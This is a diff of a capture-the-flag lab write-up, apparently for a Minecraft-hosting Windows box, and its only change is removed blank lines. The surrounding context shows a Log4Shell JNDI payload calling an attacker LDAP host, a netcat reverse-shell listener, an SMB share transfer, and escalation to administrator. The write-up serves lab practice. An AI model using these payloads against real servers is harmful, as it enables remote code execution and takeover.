@@ -102,7 +102,6 @@ Send LDAP reference result for a redirecting to http://10.10.14.4:80/Exploit.cla
 ```
 
 Now in a Minecraft Console Client, Send your payload as a message and you will see the reverse shell
-
 ```
 <lol> ${jndi:ldap://10.10.14.4:1389/a}
 [MCC] You have respawned.         
@@ -113,7 +112,6 @@ lol was slain by Zombie
 ```
 
 Got the user shell. Get your user flag from the Desktop folder
-
 ```
 $ nc -lvnp 4444     
 listening on [any] 4444 ...
@@ -166,7 +164,6 @@ C:\USERS\PUBLIC
 ```
 
 Upon surfing the `C:\Users\svc_minecraft\server\plugins>` directory, I found that there was a JAR file present, that is `playercounter-1.0-SNAPSHOT.jar`.
-
 #### impacket-smbshare using password
 
 This box wasn't allowing me to simply use `impacket-smbserer` without password Just like I have used it. So this time, i will have to provide the credentials.
@@ -239,8 +236,6 @@ whoami
 crafty\administrator
 ```
 Get your root flag.
-
-
 ### Lesson Learned
 
 1.  Log4J PoC needs modification to run
